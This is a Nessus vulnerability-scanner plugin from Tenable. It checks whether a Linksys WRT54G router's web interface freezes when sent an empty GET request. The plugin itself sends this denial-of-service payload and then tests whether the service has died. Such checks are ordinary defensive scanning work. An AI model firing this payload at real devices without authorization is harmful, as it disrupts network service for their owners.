#TRUSTED 34a4a35062b0c15857472c37c17726a33c2237004c89822ae71e427d1dadac8f8381a85058a7b3bbfe5bedc736382eaaed2b581dba0b91bfe435f53f86e1aa27355f797e87eb493206593e6cb9fb4c9992cbe747b9b3c209b48501459f5e5434e7646d9711b303167dc466a281a8d38dd9aa5195308fbe031a3b1950eb3a63eaaf21d0158eb91f8e74a518e33c9195bd6eb1d591cdd85cccc44e308f50a6f5bf18ed02c50b4cdbce26eaa29dc1b7e9f2b2d52f306d68111bbe2c74dbde07e789ebfff0dc7cd35acbbaa94f8c9363d1e1ee1092a3bfa7423e6a6e93a48c4fd31c499d54453f62ca4ae0bccb7d9fb3202b1935ccdc70d3efff3d20b23d68a94cd675e7833e5289ed0b4c6d0d4eed7e2f4d08d8cdfc5d503e369323b95f955bbdacee7bdf53ef270f3e8e0cb8a94c615466999363d0d55a1b44312a54ef33449dab89a73e2a0a9ce78c196fda29f085206aa27449e9aa6201096931e417cb567604fbc69cc6f7cd84855d75899d9047726a5b6e07dd7213465571b5d3b3fb78004ee23eeb5b70bed75d744bf4a44734f26576ee26b90531f09979ae925e5ed46c5fedb6a1507d31938789b0c3f5f5733a779915f2ade1fa642b3dc04d6c0db0f53877c87db7544e831de49e937ac1addf56d646c0e0f612fac57423764986a0931061a38bde20ab7f46bdad4486129202b770f7bebda1dada89aea92d67d5bdc580
#
# (C) Tenable Network Security, Inc.
#
# References:
# http://www.nessus.org/u?6629f502
#
# I wonder if this script is useful: the router is probably already dead.
#

include('compat.inc');

if (description)
{
  script_id(11941);
  script_version("1.21");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/05/16");

  script_name(english:"Linksys WRT54G Empty GET Request Remote DoS");
  script_summary(english:"Empty GET request freezes Linksys WRT54G HTTP interface");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a denial of service
vulnerability.");
  script_set_attribute(attribute:"description", value:
"It is possible to freeze the remote web server by sending an empty GET
request.  This is known to affect Linksys WRT54G routers.");
  # http://web.archive.org/web/20050117183452/http://www.zone-h.org/en/advisories/read/id=3523/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6629f502");
  script_set_attribute(attribute:"solution", value:"Contact the vendor and, if applicable, upgrade the router's firmware.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L");
  script_set_attribute(attribute:"cvss_score_source", value:"manual");
  script_set_attribute(attribute:"cvss_score_rationale", value:"Based on analysis of vendor advisory.");

  script_set_attribute(attribute:"vuln_publication_date", value:"2003/12/04");
  script_set_attribute(attribute:"plugin_publication_date", value:"2003/12/04");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/h:cisco:linksys_wrt54gc_router");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_DENIAL);

  script_copyright(english:"This script is Copyright (C) 2003-2022 Tenable Network Security, Inc.");
  script_family(english:"CISCO");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}

include('http.inc');
var affected = FALSE;
var port = get_http_port(default:80, embedded: 1);

if (http_is_dead(port:port)) audit(AUDIT_PORT_CLOSED, port);

var http_send = http_send_recv_buf(port: port, data: 'GET\r\n');

sleep(2);

if (http_is_dead(port: port, retry: 3))
{
  var affected = TRUE;
  var report = '\nNessus detected that it was possible to freeze the remote web server running on port ' + port +
  ' by sending an empty GET request.\n' + http_last_sent_request() +'\n';

  security_report_v4(port:port, severity:SECURITY_WARNING, extra:report);
}
if(!affected) audit(AUDIT_HOST_NOT, "affected");
